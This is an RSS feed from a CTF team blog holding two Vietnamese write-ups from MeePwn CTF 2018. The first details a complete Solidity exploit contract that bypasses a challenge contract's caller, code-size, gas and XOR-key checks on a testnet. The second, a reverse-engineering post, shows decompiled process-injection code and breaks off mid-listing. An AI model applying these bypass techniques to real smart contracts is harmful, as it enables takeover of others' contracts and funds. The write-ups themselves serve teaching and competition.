<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	
xmlns:georss="http://www.georss.org/georss" xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"
>

<channel>
	<title>BabyPhD CTF Team</title>
	<atom:link href="https://babyphd.net/feed/" rel="self" type="application/rss+xml" />
	<link>https://babyphd.net</link>
	<description>NÃ³i chung Ä‘Ã¢y lÃ  má»™t khÃ¡i niá»‡m vÃ´ cÃ¹ng trá»«u tÆ°á»£ng</description>
	<lastBuildDate>Thu, 16 Aug 2018 21:09:22 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.2.2</generator>
<site xmlns="com-wordpress:feed-additions:1">104079289</site>	<item>
		<title>MEEPWN CTF 2018 - meepwn contract</title>
		<link>https://babyphd.net/2018/08/01/meepwn-ctf-2018-meepwn-contract/</link>
				<pubDate>Wed, 01 Aug 2018 12:47:31 +0000</pubDate>
		<dc:creator><![CDATA[vigov5]]></dc:creator>
				<category><![CDATA[misc]]></category>
		<category><![CDATA[smartcontract]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=771</guid>
				<description><![CDATA[https://scoreboard.meepwn.team/task Source code cá»§a "gate": pragma solidity ^0.4.18; contract Meepwn_Wire { address public entrant; constructor() { entrant = msg.sender; } function isAccountAddress(address addr) private returns(bool) { uint x; assembly { x := extcodesize(caller) } return x == 0; } function exploitMe(bytes8 _key) { require(msg.sender != tx.origin); require(isAccountAddress(msg.sender)); require(msg.gas % 1337 == 0); require(uint64(_key) ^ uint64(sha3(msg.sender)) &#8230; <a href="https://babyphd.net/2018/08/01/meepwn-ctf-2018-meepwn-contract/" class="more-link">Continue reading <span class="screen-reader-text">MEEPWN CTF 2018 - meepwn contract</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<p><a href="https://scoreboard.meepwn.team/task" target="_blank" rel="noopener">https://scoreboard.meepwn.team/task</a></p>
<p><img class="medium-zoom-image" src="https://i0.wp.com/images.viblo.asia/fd265c3f-adf9-428b-8bee-30682193eff2.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/fd265c3f-adf9-428b-8bee-30682193eff2.png" data-recalc-dims="1" /></p>
<p>Source code cá»§a "gate":</p>
<pre class="language-js"><code class="language-js">pragma solidity <span class="token operator">^</span><span class="token number">0.4</span><span class="token number">.18</span><span class="token punctuation">;</span>

contract Meepwn_Wire
<span class="token punctuation">{</span>
    address <span class="token keyword">public</span> entrant<span class="token punctuation">;</span>
    
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        entrant <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">function</span> <span class="token function">isAccountAddress</span><span class="token punctuation">(</span>address addr<span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token function">returns</span><span class="token punctuation">(</span>bool<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        uint x<span class="token punctuation">;</span>
        assembly <span class="token punctuation">{</span> x <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span>caller<span class="token punctuation">)</span> <span class="token punctuation">}</span>
        <span class="token keyword">return</span> x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">function</span> <span class="token function">exploitMe</span><span class="token punctuation">(</span>bytes8 _key<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">!=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">require</span><span class="token punctuation">(</span><span class="token function">isAccountAddress</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>gas <span class="token operator">%</span> <span class="token number">1337</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">require</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span>_key<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x13371337</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        entrant <span class="token operator">=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p><span id="more-771"></span></p>
<p>Interface cá»§a contract chÃ­nh:</p>
<pre class="language-js"><code class="language-js">pragma solidity <span class="token operator">^</span><span class="token number">0.4</span><span class="token number">.18</span><span class="token punctuation">;</span>

contract MeePwnMain <span class="token punctuation">{</span>

  <span class="token keyword">function</span> <span class="token function">getNewInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> payable <span class="token function">returns</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token keyword">function</span> <span class="token function">submitInstance</span><span class="token punctuation">(</span>string email<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token function">returns</span><span class="token punctuation">(</span>bytes32<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>sau khi truy cáº­p Ä‘áº¿nÂ <a href="http://178.128.87.12/smart-contract" target="_blank" rel="noopener">http://178.128.87.12/smart-contract</a>Â nhá»¯ng viá»‡c báº¡n cáº§n lÃ m nhÆ° sau (hiá»‡n site Ä‘Ã£ khÃ´ng truy cáº­p Ä‘Æ°á»£c ná»¯a, mÃ¬nh xin phÃ©p tÃ³m táº¯t láº¡i theo...kÃ­ á»©c cá»§a mÃ¬nhÂ <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f604.png" alt="ğŸ˜„" class="wp-smiley" style="height: 1em; max-height: 1em;" />)</p>
<ul>
<li>Sáº½ cÃ³ má»™t contract chÃ­nh táº¡i Ä‘á»‹a chá»‰Â <a href="https://ropsten.etherscan.io/address/0x3da169ad88c8f419b57e181fe971b33993dfdc81" target="_blank" rel="noopener">0x3da169ad88c8f419b57e181fe971b33993dfdc81</a>Â Ä‘Æ°á»£c deploy trÃªn Testnet Ropsten</li>
<li>Báº¡n sáº½ gá»i hÃ mÂ <code>getNewInstance</code>Â chuyá»ƒn 0.1 ETH vÃ o Ä‘á»‹a chá»‰ nÃ y, contract chÃ­nh sáº½ deploy contractÂ <strong>Meepwn_Wire</strong>Â á»Ÿ trÃªn vÃ  gÃ¡nÂ <code>entrant = msg.sender</code>Â tá»©c lÃ  Ä‘á»‹a chá»‰ cá»§a contract chÃ­nh.</li>
<li>Nhiá»‡m vá»¥ cá»§a báº¡n lÃ m tháº¿ nÃ o Ä‘Ã³, dÃ¹ng hÃ mÂ <code>exploitMe</code>, vÆ°á»£t qua táº¥t cáº£ cÃ¡c "gate", set láº¡i biáº¿nÂ <code>entrant</code>Â thÃ nh Ä‘á»‹a chá»‰ cá»§a mÃ¬nh (pwned !)</li>
<li>Sau Ä‘Ã³ gá»i hÃ mÂ <code>submitInstance</code>Â kÃ¨m vá»›i email cá»§a mÃ¬nh Ä‘á»ƒ chá»©ng minh mÃ¬nh Ä‘Ã£ lÃ m Ä‘Æ°á»£c, Ä‘á»ƒ há»‡ thá»‘ng gá»­i flag vá» email mÃ  báº¡n submit.</li>
</ul>
<p>Vá» cÆ¡ báº£n, mÃ´ hÃ¬nh nÃ y khÃ¡ giá»‘ng vá»›iÂ <a href="https://ethernaut.zeppelin.solutions/" target="_blank" rel="noopener">Ethernaut</a>Â cá»¥ thá»ƒ hÆ¡n thÃ¬ báº¡n cÃ³ thá»ƒ tham kháº£o thÃªm cÃ¡c bÃ i write-up cá»§a anhÂ <a href="https://viblo.asia/u/kiendinang" target="_blank" rel="noopener">@kiendinang</a>Â trÃªn Viblo, vá»›i nhiá»u cáº¥p Ä‘á»™ tá»« dá»… Ä‘áº¿n khÃ³.</p>
<h1 id="_walk-through-1">Walk Through</h1>
<p>MÃ¬nh xin tÃ³m táº¯t cÃ¡c bÆ°á»›c Ä‘á»ƒ vÆ°á»£t qua cÃ¡c gate nhÆ° sau:</p>
<h2 id="_gate-1-2">Gate 1</h2>
<p><code>require(msg.sender != tx.origin);</code>Â : Trong Solidity thÃ¬Â <code>msg.sender</code>Â lÃ  thá»©/ngÆ°á»i trá»±c tiáº¿p gá»i hÃ m cá»§a contract, cÃ²nÂ <code>tx.origin</code>Â lÃ  ngÆ°á»i táº¡o ra transaction. Do váº­yÂ <code>tx.origin</code>Â sáº½ luÃ´n lÃ  ngÆ°á»i dÃ¹ng, cÃ²nÂ <code>msg.sender</code>Â thÃ¬ cÃ³ thá»ƒ lÃ  ngÆ°á»i dÃ¹ng hoáº·c lÃ  má»™t contract khÃ¡c. Do váº­y ta cÃ³ mÃ´ hÃ¬nh sau:</p>
<pre class="language-none"><code class="language-none">A (ngÆ°á»i dÃ¹ng) -&gt; B (exploit contract) -&gt; C (Meepwn_Wire contract)
</code></pre>
<p>Vá»›i mÃ´ hÃ¬nh nÃ y sáº½ Ä‘áº£m báº£o Ä‘Æ°á»£cÂ <code>msg.sender != tx.origin</code></p>
<h2 id="_gate-2-3">Gate 2</h2>
<p><code>require(isAccountAddress(msg.sender));</code>Â : Gate nÃ y Ä‘Ãºng nhÆ° tÃªn hÃ m, kiá»ƒm tra xem Ä‘á»‹a chá»‰ Ä‘ang tÆ°Æ¡ng tÃ¡c vá»›i contract, cÃ³ pháº£i lÃ  ngÆ°á»i dÃ¹ng khÃ´ng hay lÃ  má»™t contract khÃ¡c ? vÃ Â <strong>Meepwn_Wire</strong>Â yÃªu cáº§uÂ <code>msg.sender</code>Â pháº£i lÃ  má»™t account ngÆ°á»i dÃ¹ng thÃ´ng qua viá»‡c kiá»ƒm tra storage cá»§a account cÃ³ chá»©a code hay khÃ´ng báº±ng Ä‘oáº¡n assembly (náº¿u Ä‘á»‹a chá»‰ lÃ  ngÆ°á»i dÃ¹ng thÃ¬ sáº½ codesize == 0, vÃ  ngÆ°á»£c láº¡i náº¿u Ä‘Ã³ lÃ  má»™t contract khÃ¡c)</p>
<pre class="language-js"><code class="language-js">assembly <span class="token punctuation">{</span> x <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span>caller<span class="token punctuation">)</span> <span class="token punctuation">}</span>
</code></pre>
<p>Náº¿u váº­y, trick chÃºng ta dÃ¹ng á»Ÿ bÆ°á»›c 1 sáº½ fail ? Tuy nhiÃªn, cÃ³ má»™t thá»i Ä‘iá»ƒm mÃ  codesize cá»§a má»™t contract báº±ng 0, Ä‘Ã³ chÃ­nh lÃ  thá»i Ä‘iá»ƒm mÃ  contract Ä‘Æ°á»£c deploy (nÃ³i cÃ¡ch khÃ¡c, khi Ä‘ang cháº¡y contructor cá»§a contract), nhÆ° Ä‘Æ°á»£c note trongÂ <a href="https://github.com/ethereum/yellowpaper" target="_blank" rel="noopener">yellow paper</a>Â cá»§a Ethereum. Váº­y Ä‘á»ƒ pass qua gate nÃ y, ta cáº§n thá»±c hiá»‡n exploit trong contructor cá»§a contract. Äáº¿n Ä‘Ã¢y ta cÃ³ thá»ƒ xÃ¢y dá»±ng Ä‘Æ°á»£c contract táº¡m thá»i dÃ¹ng Ä‘á»ƒ exploit nhÆ° sau:</p>
<pre class="language-js"><code class="language-js">contract HackMeepwn_Wire <span class="token punctuation">{</span>
    
    address <span class="token keyword">public</span> target <span class="token operator">=</span> <span class="token number">0x9a6210545c23d287496c518564b3db5f3efb2918</span><span class="token punctuation">;</span>
    
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Meepwn_Wire t <span class="token operator">=</span> <span class="token function">Meepwn_Wire</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
        t<span class="token punctuation">.</span><span class="token function">exploitMe</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>vá»›i target lÃ  Ä‘á»‹a chá»‰ cá»§a contractÂ <code>Meepwn_Wire</code>Â mÃ  contract chÃ­nh Ä‘Ã£ deploy. Äá»ƒ biáº¿t Ä‘Æ°á»£c Ä‘á»‹a chá»‰ nÃ y, báº¡n cÃ³ thá»ƒ tÃ¬m Ä‘áº¿n transactionÂ <code>getNewInstance</code>Â trÃªnÂ <a href="https://ropsten.etherscan.io/" target="_blank" rel="noopener">https://ropsten.etherscan.io/</a>Â vÃ  kiá»ƒm tra tabÂ <code>Internal Transactions</code>.</p>
<h2 id="_gate-3-4">Gate 3</h2>
<p><code>require(msg.gas % 1337 == 0);</code>Â : Gate nÃ y yÃªu cáº§u sá»‘ gas cÃ²n láº¡i (<code>msg.gas</code>) táº¡i thá»i Ä‘iá»ƒm thá»±c hiá»‡n kiá»ƒm tra pháº£i chia háº¿t cho 1337. Äá»ƒ thá»±c hiá»‡n Ä‘iá»u nÃ y, ta cÃ³ thá»ƒ gá»i hÃ mÂ <code>exploitMe</code>Â theo cÃ¡ch sau:</p>
<pre class="language-js"><code class="language-js">t<span class="token punctuation">.</span>exploitMe<span class="token punctuation">.</span><span class="token function">gas</span><span class="token punctuation">(</span>xxx<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token punctuation">)</span>
</code></pre>
<p>vá»›iÂ <code>xxx</code>Â lÃ  sá»‘ gas dÃ¹ng Ä‘á»ƒ cháº¡y hÃ mÂ <code>exploitMe</code>. NhÆ° váº­y chÃºng ta sáº½ control Ä‘Æ°á»£c sá»‘ gas truyá»n vÃ o. Váº­y truyá»n vÃ o bao nhiÃªu gas Ä‘á»ƒ thoáº£ mÃ£n ? MÃ¬nh sáº½ lÃ m theo cÃ¡ch thá»­ saim truyá»n vÃ o 1 sá»‘ gas tuá»³ Ã½, vÃ  kiá»ƒm tra instruction trÃªn Remix.</p>
<pre class="language-js"><code class="language-js">contract HackMeepwn_Wire <span class="token punctuation">{</span>
    
    address <span class="token keyword">public</span> target <span class="token operator">=</span> <span class="token number">0x9a6210545c23d287496c518564b3db5f3efb2918</span><span class="token punctuation">;</span>
    
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Meepwn_Wire t <span class="token operator">=</span> <span class="token function">Meepwn_Wire</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
        t<span class="token punctuation">.</span>exploitMe<span class="token punctuation">.</span><span class="token function">gas</span><span class="token punctuation">(</span><span class="token number">98000</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0x41414141</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>VÃ­ dá»¥ cháº¡y vá»›i gas 98000, cháº¯c cháº¯n transaction sáº½ fail, báº±ng sá»­ dá»¥ng mÃ´i trÆ°á»ng Javascript VM trÃªn Remix sáº½ cho phÃ©p chÃºng ta debug:<img class="medium-zoom-image" src="https://i2.wp.com/images.viblo.asia/a22a0df6-77f0-4920-b715-634fa749ffda.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/a22a0df6-77f0-4920-b715-634fa749ffda.png" data-recalc-dims="1" /></p>
<p>ClickÂ <code>Debug</code>, má»Ÿ pháº§nÂ <code>Instructions</code>Â vÃ Â <code>Stack</code>Â vÃ  step qua tá»«ng instruction cho Ä‘áº¿n Ä‘oáº¡n kiá»ƒm tra sá»‘ gas:</p>
<p><img class="medium-zoom-image" src="https://i1.wp.com/images.viblo.asia/bd209629-0feb-4b81-934e-bb8d9d5f8705.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/bd209629-0feb-4b81-934e-bb8d9d5f8705.png" data-recalc-dims="1" /></p>
<p>IP hiá»‡n Ä‘ang á»Ÿ 363, ngay sau khi chÃºng ta cháº¡y xongÂ <code>GAS</code>, top stack lÃºc nÃ y sáº½ chÃ­nh lÃ  sá»‘ gas cÃ²n láº¡i:Â <code>0x17abc = 96956</code>Â (táº¡i ngÄƒn tiáº¿p theo chÃ­nh lÃ  giÃ¡ trá»‹Â <code>0x539</code>Â = 1337). Váº­y ta sáº½ cÃ³ gas thoáº£ mÃ£n lÃ :</p>
<pre class="language-none"><code class="language-none">98000 - 96956 % 1337 = 97308
</code></pre>
<p><strong>Note</strong>: Äá»ƒ Ä‘áº£m báº£o debug Ä‘Ãºng thÃ¬ version compiler vÃ  thiáº¿t láº­p optimize cá»§a báº¡n vÃ  Ä‘á» bÃ i pháº£i giá»‘ng nhau, ráº¥t may, Ä‘á»u Ä‘ang lÃ  versionÂ <code>soljson-v0.4.24+commit.e67f0147.js</code>Â <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f604.png" alt="ğŸ˜„" class="wp-smiley" style="height: 1em; max-height: 1em;" />, cÆ¡ mÃ  náº¿u cÃ³ sai thÃ¬ cÅ©ng sai khÃ¡c nhau khÃ´ng quÃ¡ 100 gas, chÃºng ta cÃ³ thá»ƒ brute-force Ä‘Æ°á»£cÂ <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f606.png" alt="ğŸ˜†" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
<h2 id="_gate-4-5">Gate 4</h2>
<p><code>require(uint64(_key) ^ uint64(sha3(msg.sender)) ^ uint64(sha3(address(this))) == 0x13371337);</code>Â : gate nÃ y lÃ  khÃ¡ Ä‘Æ¡n giáº£n (tuy nhiÃªn trong thá»i gian thi BTC Ä‘Ã£ khÃ´ng may Ä‘eploy nháº§m source code Ä‘oáº¡n nÃ y khiáº¿n cÃ¡c Ä‘á»™i thi tá»‘n cá»¡ "1 tiáº¿ng" tÃ¬m cÃ¡ch brute-force 8 bytes sha3 (náº¿u thá»±c sá»± cÃ³ team Ä‘á»‹nh lÃ m váº­yÂ <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f605.png" alt="ğŸ˜…" class="wp-smiley" style="height: 1em; max-height: 1em;" />)), Ä‘Ã¢y lÃ  phÃ©p XOR vÃ  chÃºng ta lÃ m láº¡i nhÆ° sau:</p>
<pre class="language-js"><code class="language-js">_key <span class="token operator">=</span> <span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x13371337</span><span class="token punctuation">)</span>

</code></pre>
<p><code>this</code>Â á»Ÿ Ä‘Ã¢y sáº½ cho ra Ä‘á»‹a chá»‰ contract exploit cá»§a chÃºng ta.</p>
<h2 id="_full-exploit-6">Full Exploit</h2>
<p>(Test thá»­ trÃªn Remix trÆ°á»›c cho cháº¯c Äƒn rá»“i hÃ£y submit nhÃ©)</p>
<pre class="language-js"><code class="language-js">contract HackMeepwn_Wire <span class="token punctuation">{</span>
    
    address <span class="token keyword">public</span> target <span class="token operator">=</span> <span class="token number">0x9a6210545c23d287496c518564b3db5f3efb2918</span><span class="token punctuation">;</span>
    
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Meepwn_Wire t <span class="token operator">=</span> <span class="token function">Meepwn_Wire</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
        t<span class="token punctuation">.</span>exploitMe<span class="token punctuation">.</span><span class="token function">gas</span><span class="token punctuation">(</span><span class="token number">97308</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x13371337</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>Viá»‡c cÃ²n láº¡i lÃ  thá»±c hiá»‡nÂ <code>submitInstance</code>Â vÃ  chá» mail flag vá»:</p>
<p><img class="medium-zoom-image" src="https://i0.wp.com/images.viblo.asia/24d169be-0e35-4eb1-8c0c-c715b9ed1b46.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/24d169be-0e35-4eb1-8c0c-c715b9ed1b46.png" data-recalc-dims="1" /></p>
<h1 id="_references-7">References</h1>
<ul>
<li><a href="https://viblo.asia/s/blockchain-smart-contract-Am5yq0mq5db" target="_blank" rel="noopener">https://viblo.asia/s/blockchain-smart-contract-Am5yq0mq5db</a></li>
<li><a href="http://solidity.readthedocs.io/en/v0.4.24/" target="_blank" rel="noopener">http://solidity.readthedocs.io/en/v0.4.24/</a></li>
</ul>
]]></content:encoded>
									<post-id xmlns="com-wordpress:feed-additions:1">771</post-id>	</item>
		<item>
		<title>MEEPWN CTF 2018 - XSS</title>
		<link>https://babyphd.net/2018/07/17/meepwn-ctf-2018-xss/</link>
				<pubDate>Tue, 17 Jul 2018 16:55:34 +0000</pubDate>
		<dc:creator><![CDATA[yeuchimse]]></dc:creator>
				<category><![CDATA[re]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=751</guid>
				<description><![CDATA[LÃºc Ä‘áº§u nhÃ¬n tÃªn bÃ i mÃ¬nh cá»© nghÄ© lÃ  dáº¡ng binary .Net chá»©a máº¥y Ä‘á» XSS giá»‘ng á»Ÿ SECCON, nÃªn cÃ²n khÃ´ng buá»“n Ä‘á»c Ä‘á». Äáº¿n lÃºc lÃ m thÃ¬ tháº¥y lÃ  cÅ©ng liÃªn quan tháº­t. File binary khi Ä‘Æ°á»£c cháº¡y sáº½ fork thÃªm 1 process ná»¯a, rá»“i process má»›i nÃ y láº¡i fork má»™t process khÃ¡c, &#8230; <a href="https://babyphd.net/2018/07/17/meepwn-ctf-2018-xss/" class="more-link">Continue reading <span class="screen-reader-text">MEEPWN CTF 2018 - XSS</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_20-57-55.png?ssl=1"><img data-attachment-id="752" data-permalink="https://babyphd.net/2018/07/17/meepwn-ctf-2018-xss/2018-07-17_20-57-55/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_20-57-55.png?fit=683%2C317&amp;ssl=1" data-orig-size="683,317" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2018-07-17_20-57-55" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_20-57-55.png?fit=300%2C139&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_20-57-55.png?fit=604%2C280&amp;ssl=1" class="aligncenter wp-image-752 size-full" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_20-57-55.png?resize=604%2C280&#038;ssl=1" alt="" width="604" height="280" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_20-57-55.png?w=683&amp;ssl=1 683w, https://i0.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_20-57-55.png?resize=300%2C139&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a>LÃºc Ä‘áº§u nhÃ¬n tÃªn bÃ i mÃ¬nh cá»© nghÄ© lÃ  dáº¡ng binary .Net chá»©a máº¥y Ä‘á» XSS giá»‘ng á»Ÿ SECCON, nÃªn cÃ²n khÃ´ng buá»“n Ä‘á»c Ä‘á». Äáº¿n lÃºc lÃ m thÃ¬ tháº¥y lÃ  cÅ©ng liÃªn quan tháº­t.</p>
<p>File binary khi Ä‘Æ°á»£c cháº¡y sáº½ fork thÃªm 1 process ná»¯a, rá»“i process má»›i nÃ y láº¡i fork má»™t process khÃ¡c, tá»•ng lÃ  3 process. Má»—i process nÃ y sáº½ dá»±a theo sá»‘ lÆ°á»£ng tham sá»‘ truyá»n vÃ o Ä‘á»ƒ xá»­ lÃ½ theo nhÃ¡nh riÃªng cá»§a nÃ³ (process Ä‘áº§u khÃ´ng cÃ³ tham sá»‘, process thá»© hai cÃ³ 1 tham sá»‘ lÃ  <code>1</code>, process thá»© ba cÃ³ 2 tham sá»‘ lÃ  <code>1</code>Â vÃ  <code>2</code>). MÃ¬nh debug báº±ng cÃ¡ch attach 3 cá»­a sá»• IDA vÃ o láº§n lÆ°á»£t 3 process.<span id="more-751"></span></p>
<p>Náº¿u cá»© diá»…n giáº£i láº§n lÆ°á»£t tá»«ng bÆ°á»›c thÃ¬ khÃ¡ dÃ i dÃ²ng, vá» cÆ¡ báº£n lÃ  cÃ¡c process sáº½ tÆ°Æ¡ng tÃ¡c vá»›i nhau báº±ng cÃ¡ch inject code vÃ  thá»±c thi thÃ´ng qua cÃ¡c hÃ m: <code>OpenProcess</code>, <code>VirtualAllocEx</code>,Â <code>ReadProcessMemory</code>,Â <code>WriteProcessMemory</code>, <code>WaitForSingleObject</code>, <code>ReleaseSemaphore</code>,Â  vÃ  <code>CreateRemoteThread</code>. CÃ¡c code Ä‘Æ°á»£c inject tÆ°Æ¡ng Ä‘á»‘i giá»‘ng nhau, cÃ³ dáº¡ng tháº¿ nÃ y (Ä‘Ã¢y lÃ  code Ä‘á»c input tá»« ngÆ°á»i chÆ¡i):</p>
<pre>    v11 = 0;
    hObject = 0;
    while ( WaitForSingleObject(*(&amp;dword_4F4FFC + (_DWORD)lpParameter), 1u) == 258 )
        ;
    arr1[0] = 97;
    arr1[1] = 98;
    arr1[2] = 99;
    arr1[3] = 100;
    arr1[4] = 97;
    arr1[5] = 98;
    arr1[6] = 99;
    arr1[7] = 100;
    arr1[8] = 97;
    arr1[9] = 98;
    arr1[10] = 99;
    arr1[11] = 100;
    arr1[12] = 97;
    arr1[13] = 98;
    arr1[14] = 99;
    arr1[15] = 100;
    arr2[0] = 106;
    arr2[1] = 21;
    arr2[2] = 109;
    arr2[3] = 11;
    arr2[4] = -99;
    arr2[5] = -16;
    arr2[6] = -62;
    arr2[7] = 52;
    arr2[8] = 116;
    arr2[9] = -118;
    arr2[10] = -44;
    arr2[11] = 79;
    arr2[12] = 80;
    arr2[13] = -124;
    arr2[14] = -96;
    arr2[15] = 127;
    for ( i = 0; i &lt; 16; ++i )
    {
        v8 = getchar();
        arr1[i] = v8 ^ arr2[i];
    }
    while ( WaitForSingleObject(*(&amp;hHandle + (_DWORD)lpParameter), 1u) == 258 )
        ;
    hProcess = OpenProcess(dwDesiredAccess, 0, *(&amp;BaseAddress + (_DWORD)lpParameter));
    if ( !hProcess )
        exit(0);
    v13 = 0;
    lpBaseAddress = (LPCVOID)BaseAddress;
    Buffer = 0;
    while ( 1 )
    {
        v13 = ReadProcessMemory(hProcess, lpBaseAddress, &amp;Buffer, 1u, 0);
        if ( !v13 )
            exit(0);
        if ( Buffer == 198 )
            break;
        lpBaseAddress = (char *)lpBaseAddress + 1;
    }
    lpBaseAddress = (char *)lpBaseAddress - 1;
    for ( j = 0; j &lt; 16; ++j )
    {
